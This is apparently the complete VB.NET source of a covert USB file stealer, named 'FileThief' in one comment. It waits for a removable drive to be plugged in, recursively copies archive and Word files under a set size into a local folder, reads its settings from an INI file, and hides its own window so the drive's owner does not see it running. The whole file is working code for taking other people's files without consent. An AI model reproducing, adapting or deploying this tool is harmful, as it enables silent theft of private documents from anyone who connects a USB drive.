Imports System.IO
Imports Microsoft.VisualBasic.FileIO
Public Class Form1
    Public Const WM_DEVICECHANGE = &H219
    Public Const DBT_DEVICEARRIVAL = &H8000
    Public Const DBT_CONFIGCHANGECANCELED = &H19
    Public Const DBT_CONFIGCHANGED = &H18
    Public Const DBT_CUSTOMEVENT = &H8006
    Public Const DBT_DEVICEQUERYREMOVE = &H8001
    Public Const DBT_DEVICEQUERYREMOVEFAILED = &H8002
    Public Const DBT_DEVICEREMOVECOMPLETE = &H8004
    Public Const DBT_DEVICEREMOVEPENDING = &H8003
    Public Const DBT_DEVICETYPESPECIFIC = &H8005
    Public Const DBT_DEVNODES_CHANGED = &H7
    Public Const DBT_QUERYCHANGECONFIG = &H17
    Public Const DBT_USERDEFINED = &HFFFF

    Public USBDrive As String, strConfig = Application.StartupPath & "\config.ini", USBLabel As String

    Public conType() As String, conSize As Integer, conPath As String, conLabel() As String

    Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Int32, ByVal lpFileName As String) As Int32
    Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal lpString As String, ByVal lpFileName As String) As Int32

    Public Function ReadINI(ByVal Section As String, ByVal AppName As String, ByVal lpDefault As String, ByVal FileName As String) As String
        Dim Str As String = LSet(Str, 256)
        GetPrivateProfileString(Section, AppName, lpDefault, Str, Len(Str), FileName)
        Return Microsoft.VisualBasic.Left(Str, InStr(Str, Chr(0)) - 1)
    End Function

    Public Function WriteINI(ByVal Section As String, ByVal AppName As String, ByVal lpDefault As String, ByVal FileName As String) As Long
        WriteINI = WritePrivateProfileString(Section, AppName, lpDefault, FileName)
    End Function

    Protected Overrides Sub WndProc(ByRef m As Message)
        If m.Msg = WM_DEVICECHANGE Then
            Select Case m.WParam
                Case WM_DEVICECHANGE
                Case DBT_DEVICEARRIVAL ' USB Driver Connected 
                    Dim s() As DriveInfo = DriveInfo.GetDrives
                    For Each drive As DriveInfo In s
                        If drive.DriveType = DriveType.Removable Then
                            USBDrive = drive.Name ' USB Driver Connected - drive.Name
                            USBLabel = drive.VolumeLabel
                            Debug.Print(USBDrive & "-" & USBLabel)
                            ScanFile(USBDrive, conLabel, conType)
                        End If
                    Next
                Case DBT_CONFIGCHANGECANCELED
                Case DBT_CONFIGCHANGED
                Case DBT_CUSTOMEVENT
                Case DBT_DEVICEQUERYREMOVE
                Case DBT_DEVICEQUERYREMOVEFAILED
                Case DBT_DEVICEREMOVECOMPLETE
                    USBDrive = "" ' USB Driver Disconnected
                Case DBT_DEVICEREMOVEPENDING
                Case DBT_DEVICETYPESPECIFIC
                Case DBT_DEVNODES_CHANGED
                Case DBT_QUERYCHANGECONFIG
                Case DBT_USERDEFINED
            End Select
        End If
        MyBase.WndProc(m)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If Not File.Exists(strConfig) Then
            ' Set which type of files should be copied
            ' Separated by |
            WriteINI("FileType", "Type", "rar|zip|7z|doc|docx", strConfig)
            ' File whose size is smaller than the set value will be copied, 10 MB (10240 KB) is the default value
            ' Units KB (1024 KB = 1 MB, 1024 MB = 1GB, etc.)
            WriteINI("FileType", "Size", "10240", strConfig)
            ' Set where to save the file. Leaving blank means saving to the default location
            ' Default path is %ApplictionPath%/Files (e.g. F:\FileThief\Files)
            WriteINI("FileType", "Path", "", strConfig)
            ' Set the volume label of USB Driver which you want to copy file from
            ' Leaving blank means copying from all of USB Drivers
            ' Default is blank
            WriteINI("Driver", "VolumeLabel", "", strConfig)
            If Not Directory.Exists(Application.StartupPath & "\Files") Then
                Directory.CreateDirectory(Application.StartupPath & "\Files")
            End If
        Else
            conType = ReadINI("FileType", "Type", "rar|zip|7z|doc|docx", strConfig).Split("|")
            conSize = ReadINI("FileType", "Size", "10240", strConfig)
            conPath = ReadINI("FileType", "Path", "", strConfig)
            If conPath = "" Then conPath = Application.StartupPath & "\Files"
            conLabel = ReadINI("Driver", "VolumeLabel", "", strConfig).Split("|")
            If Not Directory.Exists(conPath) And conPath <> "" Then
                Directory.CreateDirectory(conPath)
            End If
        End If
    End Sub

    Public Function ScanFile(Driver As String, VolumeLabel() As String, Extension() As String)
        If Not (Driver Is Nothing) Then
            Dim mFileInfo As FileInfo
            Dim mDir As DirectoryInfo
            Dim mDirInfo As New DirectoryInfo(Driver)
            Dim i As Integer = 1
            Try
                If VolumeLabel.Count >= 1 And VolumeLabel(0) <> "" Then
                    'Debug.Print("Volume D - " & VolumeLabel.Count)
                    For Each VLabel In VolumeLabel
                        If VLabel = USBLabel Then ' Check Volume Label
                            For Each ExName In Extension ' Check Extension Name
                                For Each mFileInfo In mDirInfo.GetFiles("*." & ExName)
                                    If FormatNumber((mFileInfo.Length / 1024), 0) <= conSize Then 'Check File Size
                                        'Copy File
                                        Debug.Print(mFileInfo.FullName)
                                        FileCopy(mFileInfo.FullName, conPath & "\" & Path.GetFileName(mFileInfo.FullName))
                                    End If
                                Next
                            Next
                            For Each mDir In mDirInfo.GetDirectories
                                ScanFile(mDir.FullName, VolumeLabel, Extension)
                            Next
                        End If
                    Next
                Else
                    'Debug.Print("未指定卷标")
                    For Each ExName In Extension ' Check Extension Name
                        For Each mFileInfo In mDirInfo.GetFiles("*." & ExName)
                            If FormatNumber((mFileInfo.Length / 1024), 0) <= conSize Then 'Check File Size
                                'Copy File
                                Debug.Print(mFileInfo.FullName)
                                FileCopy(mFileInfo.FullName, conPath & "\" & Path.GetFileName(mFileInfo.FullName))
                            End If
                        Next
                    Next
                    For Each mDir In mDirInfo.GetDirectories
                        ScanFile(mDir.FullName, VolumeLabel, Extension)
                    Next
                End If
            Catch ex As DirectoryNotFoundException
                Debug.Print("目录没找到：" + ex.Message)
            End Try
        End If
    End Function

    Private Sub Form1_Paint(sender As Object, e As PaintEventArgs) Handles Me.Paint
        Me.Visible = False
    End Sub
End Class
